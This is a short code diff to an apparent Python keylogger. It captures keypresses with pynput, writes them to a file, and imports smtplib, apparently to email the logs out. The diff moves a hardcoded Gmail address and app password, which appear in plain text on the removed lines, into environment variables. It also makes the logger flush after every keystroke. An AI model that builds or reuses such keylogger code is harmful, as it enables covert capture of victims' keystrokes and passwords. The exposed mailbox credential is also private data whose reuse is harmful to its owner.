@@ -1,9 +1,11 @@
 import smtplib
-
+import os
+from dotenv import load_dotenv
 from pynput.keyboard import Key, Listener
+load_dotenv()
 
-EMAIL_ADDRESS = '126330392k@gmail.com'
-PASSWORD = 'zlqtphytmtmwwdbx'
+EMAIL_ADDRESS = os.environ.get("emailaddress")
+PASSWORD = os.environ.get("password")
 
 
 count = 0
@@ -17,7 +19,7 @@ def on_press(key):
     count += 1
     print("{0} pressed".format(key))
 
-    if count >= 20:
+    if count >= 1:
         count = 0
         write_file(keys)
         keys = []
